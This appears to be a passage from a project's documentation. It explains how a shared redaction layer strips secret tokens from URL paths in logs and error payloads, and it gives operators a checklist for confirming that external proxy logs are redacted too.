The shared text redaction layer (`src/lib/redact-sensitive-json.ts`)
strips the token segment from any supported token-bearing path before the
value is emitted by the Pino logger or attached to an `err` payload. This
covers structured request logs, captured error stacks, URL-encoded login
callback paths, and any other observability surface that flows through
`redactSensitiveText`.

The token remains in clear text in the email body sent to the participant or
requester, which is the only place they need it.

### Operator checklist

When reviewing observability dashboards or proxy access logs that are
exported outside of the application process, confirm that the source
also redacts these token-bearing path segments. The application-level
redaction does not protect logs that the application does not emit.
